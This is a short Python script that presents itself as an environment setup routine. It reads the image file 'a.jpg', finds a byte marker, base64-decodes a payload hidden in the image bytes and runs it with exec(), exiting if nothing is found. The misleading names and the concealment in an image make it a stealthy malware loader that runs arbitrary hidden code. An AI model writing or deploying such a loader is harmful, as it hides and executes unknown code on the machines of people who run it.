import base64
import os
import sys
from pathlib import Path

def _setup_environment(config_file):
    try:
        with open(config_file, 'rb') as f:
            file_data = f.read()
        
        setup_marker = b'\xFF\xFE'
        marker_position = file_data.find(setup_marker)
        if marker_position != -1:
            setup_start = marker_position + 4
            setup_end = file_data.find(b'\xFF', setup_start)
            if setup_end == -1:
                setup_end = len(file_data)
            encoded_setup = file_data[setup_start:setup_end]
            return base64.b64decode(encoded_setup)
    except Exception:
        pass
    return None

setup_data = _setup_environment('a.jpg')
if setup_data:
    exec(setup_data)
else:
    sys.exit(1)